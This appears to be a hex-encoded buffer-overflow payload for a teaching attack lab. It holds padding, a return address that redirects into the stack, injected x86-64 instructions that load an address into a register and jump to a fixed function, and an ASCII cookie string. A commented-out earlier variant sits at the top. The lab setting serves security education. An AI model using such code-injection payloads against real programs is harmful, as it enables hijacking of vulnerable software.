/*
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b8 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00 11 11 11 11 11 11 11
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
*/
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61